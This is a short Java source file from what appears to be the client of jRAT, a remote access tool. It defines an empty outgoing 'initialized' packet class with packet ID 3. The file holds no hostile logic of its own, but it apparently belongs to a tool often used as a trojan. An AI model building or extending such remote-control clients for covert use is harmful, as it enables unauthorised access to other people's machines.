package jrat.client.packets.outgoing;

import jrat.common.io.StringWriter;
import java.io.DataOutputStream;

public class Packet3Initialized extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		
	}

	@Override
	public short getPacketId() {
		return 3;
	}

}
